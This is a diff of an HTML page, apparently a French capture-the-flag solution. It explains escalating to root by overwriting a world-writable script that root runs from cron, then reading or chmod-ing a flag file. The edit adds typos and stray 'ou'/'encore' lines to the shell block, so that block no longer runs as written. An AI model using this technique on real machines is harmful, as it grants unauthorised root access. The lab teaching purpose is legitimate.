@@ -85,20 +85,22 @@ ssh-keygen -f '~/.ssh/known_hosts' -R '[localhost]:2222'
     <div id="boxContent" style="display: none; margin-top: 20px; background: #f8f8f8; padding: 15px; border-radius: 6px;">
 
         <p>
-            Le script <code>run.sh</code> appartient à l’utilisateur mais possède des permissions <code>777</code>.  
-            Or, il est exécuté par <strong>root</strong> via un cron.  
-            Il suffit donc de remplacer son contenu par une commande qui lit le flag et l’écrit dans un fichier accessible.
+        Erreur de l'administrateur : le ficheir run.sh est accessible en écriture pour tout le monde. Et est executer en roor via cron. Il suffit de l modifier pour executer ce que l'on souhaite.
         </p>
 
         <pre style="white-space: pre-wrap; width: 100%;">
 # Écraser le script exécuté par root
 echo "cat /home/ciel/flag.txt > /home/ciel/pwned.txt" > ~/run.sh
-
+ou
+encore
+chmod 777 /home/ciel/flag.txt
 # Attendre le cron (1 minute)
 sleep 60
 
 # Lire le flag
 cat ~/pwned.txt
+ou
+cat ~/flag.txt
         </pre>
 
     </div>
